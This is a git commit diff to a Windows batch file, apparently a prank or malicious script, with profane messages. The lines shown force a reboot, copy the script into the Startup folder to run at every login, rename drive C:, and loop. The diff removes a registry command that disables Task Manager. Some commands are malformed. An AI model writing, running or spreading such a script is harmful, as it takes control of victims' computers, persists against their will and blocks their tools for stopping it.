0a42fd9bb340bd24ecfab4cfe9fa16f826e3e991
Makuad <dankasadovsky@gmail.com>
2025-11-01 20:20:06 +0500

    Update bat.bat

--- bat.bat
+++ bat.bat
@@ -5,8 +5,7 @@ shutdown /r /t /f 25 /c "PC FUCKING"​
 start explorer
 start mspaint
 copy %0 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
-label C:Fucked
-REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /fREG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f​
+label C:Fucked​
 goto a
 
 
